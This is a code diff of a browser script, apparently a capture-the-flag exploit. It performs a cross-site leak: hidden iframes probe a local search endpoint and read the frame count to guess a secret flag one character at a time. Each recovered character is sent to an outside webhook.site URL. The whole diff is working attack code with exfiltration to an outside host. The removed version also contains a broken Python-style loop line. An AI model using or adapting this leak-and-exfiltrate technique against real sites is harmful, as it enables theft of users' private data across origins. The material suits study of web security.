@@ -1,32 +1,28 @@
 <script>
-async function leak() {
-    const chars = "0123456789abcdef";
-    let flag = "DH{";
-    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f";
+(async () => {
+    let flag = "REh7"; 
+    flag = atob(flag);
+    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f"; 
 
-    for i in range(32) {
-        let foundChar = false;
-        for (let char of chars) {
-            const query = flag + char;
-            const iframe = document.createElement("iframe");            
+    while (!flag.includes("}")) {
+        for (let c of "0123456789abcdef}") {
+            let fr = document.createElement("iframe");
+            fr.style.display = "none";
+            document.body.appendChild(fr);
 
-            iframe.src = `http://127.0.0.1:8000/search?query=${query}`;
-
-            await new Promise((resolve) => {
-                iframe.onload = () => {
-                    if (iframe.contentWindow.frames.length > 0) {
-                        flag += char;
-                        foundChar = true;
-                        fetch(`${webhook}?flag=${flag}`);
+            await new Promise(next => {
+                fr.onload = () => {
+                    if (fr.contentWindow.frames.length) {
+                        flag += c;
+                        new Image().src = `${webhook}?d=${btoa(flag)}`;
                     }
-                    document.body.removeChild(iframe);
-                    resolve();
+                    fr.remove();
+                    next();
                 };
-                document.body.appendChild(iframe);
+                fr.src = `http://127.0.0.1:8000/search?query=${flag}${c}`;
             });
-            if (foundChar) break;
+            if (flag.endsWith(c)) break;
         }
     }
-}
-leak();
+})();
 </script>
